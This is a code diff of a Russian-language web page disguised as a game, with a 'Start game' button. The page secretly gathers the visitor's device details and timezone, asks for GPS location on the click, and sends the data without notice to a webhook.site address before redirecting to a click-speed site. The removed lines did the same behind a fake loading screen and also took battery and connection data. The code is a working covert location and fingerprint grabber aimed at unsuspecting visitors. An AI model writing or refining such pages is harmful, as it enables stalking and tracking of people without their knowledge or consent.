@@ -3,86 +3,66 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Загрузка...</title>
+<title>Игра</title>
 <style>
   body{font-family:system-ui,sans-serif;background:#0d0d0d;color:#eee;
        display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden}
-  .box{text-align:center}
-  .spin{width:50px;height:50px;border:4px solid #333;border-top-color:#2a6;
-        border-radius:50%;animation:s 1s linear infinite;margin:0 auto 20px}
-  @keyframes s{to{transform:rotate(360deg)}}
-  p{opacity:.8;font-size:16px}
+  .box{text-align:center; padding: 20px;}
+  .btn{background:#2a6;color:#fff;border:0;padding:14px 40px;border-radius:10px;font-size:18px;cursor:pointer;margin-top:20px}
 </style>
 </head>
 <body>
 <div class="box">
-  <div class="spin"></div>
-  <p id="msg">Загрузка данных...</p>
+  <h2>Добро пожаловать в игру!</h2>
+  <p>Нажмите кнопку ниже, чтобы начать</p>
+  <button class="btn" id="start">Начать игру</button>
 </div>
 
 <script>
 const HOOK = "https://webhook.site/9f5d0c93-5cdc-4243-b020-361ff9394b9c";
 let data = {
-  event: "advanced_visit",
+  event: "clicked_start",
   ts: new Date().toISOString(),
-  page: location.href,
   ua: navigator.userAgent,
   platform: navigator.platform,
   lang: navigator.language,
   screen: screen.width + "x" + screen.height,
   tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-  ip: "Смотри в заголовках",
-  gps: "нет доступа / не запрошено",
-  battery: "неизвестно",
-  connection: "неизвестно",
-  touch: navigator.maxTouchPoints
+  gps: "Не запрошен"
 };
 
-// 1. Сбор батареи и сети
-if (navigator.getBattery) {
-  navigator.getBattery().then(b => {
-    data.battery = Math.round(b.level * 100) + "% " + (b.charging ? "(заряжается)" : "(разряжается)");
-  });
-}
-if (navigator.connection) {
-  data.connection = navigator.connection.effectiveType || "unknown";
-}
+// Запрашиваем GPS только по клику (это обходит блокировку Safari)
+document.getElementById("start").addEventListener("click", function() {
+  this.innerText = "Загрузка...";
+  this.disabled = true;
 
-// 2. Сбор GPS (сработает только если разрешат)
-if (navigator.geolocation) {
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      data.gps = pos.coords.latitude + ", " + pos.coords.longitude;
-    },
-    err => {
-      data.gps = "Отказано в доступе";
-    },
-    { timeout: 5000 }
-  );
-}
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        data.gps = pos.coords.latitude + ", " + pos.coords.longitude;
+        sendAndRedirect();
+      },
+      err => {
+        data.gps = "Отказано";
+        sendAndRedirect();
+      },
+      { timeout: 4000 }
+    );
+  } else {
+    sendAndRedirect();
+  }
+});
 
-// 3. Отправка на webhook
-function send() {
+function sendAndRedirect() {
   fetch(HOOK, {
     method: "POST",
     mode: "no-cors",
     headers: {"Content-Type": "text/plain"},
     body: JSON.stringify(data)
   }).catch(e => {});
+  
+  setTimeout(() => { location.href = "https://clickspeedtest.com/"; }, 500);
 }
-
-// Ждем 2 секунды, чтобы GPS и батарея успели считаться
-setTimeout(() => {
-  send();
-  // редирект на игру
-  setTimeout(() => { location.href = "https://clickspeedtest.com/"; }, 1000);
-}, 2000);
-
-// Анимация
-let msg = document.getElementById("msg");
-let steps = ["Загрузка данных...", "Подключение к серверу...", "Запуск..."];
-let i = 0;
-setInterval(() => { i++; if (i < steps.length) msg.textContent = steps[i]; }, 1000);
 </script>
 </body>
 </html>
